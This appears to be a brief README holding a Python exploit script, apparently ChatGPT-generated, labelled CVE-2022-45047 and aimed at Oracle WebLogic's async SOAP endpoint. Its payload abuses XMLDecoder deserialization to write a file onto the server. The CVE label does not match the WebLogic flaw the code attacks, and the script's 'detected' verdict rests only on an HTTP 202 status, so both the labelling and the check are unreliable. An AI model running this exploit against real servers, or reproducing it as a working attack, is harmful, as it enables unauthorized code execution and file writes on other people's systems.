# CVE-2022-45047
POC,EXP,chatGPT for me

## code
```
import requests

target_url = "http://127.0.0.1:7001"

# CVE-2022-45047
def exploit_weblogic():
    headers = {
        "Content-Type": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
        "Accept-Encoding": "gzip, deflate"
    }
    data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java>
                    <java version="1.8.0_201" class="java.beans.XMLDecoder">
                        <object class="java.io.PrintWriter">
                            <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/4mcj4w/war/test.txt</string>
                            <void method="println">
                                <string>WebLogic CVE-2022-45047 detected!</string>
                            </void>
                            <void method="close" />
                        </object>
                    </java>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>
    '''
    try:
        response = requests.post(target_url + "/_async/AsyncResponseService", headers=headers, data=data)
    except Exception as e:
        print("Error: ", e)
        return
    if response.status_code == 202:
        print("WebLogic CVE-2022-45047 detected!")
    else:
        print("WebLogic CVE-2022-45047 not detected.")

if __name__ == '__main__':
    exploit_weblogic()

```
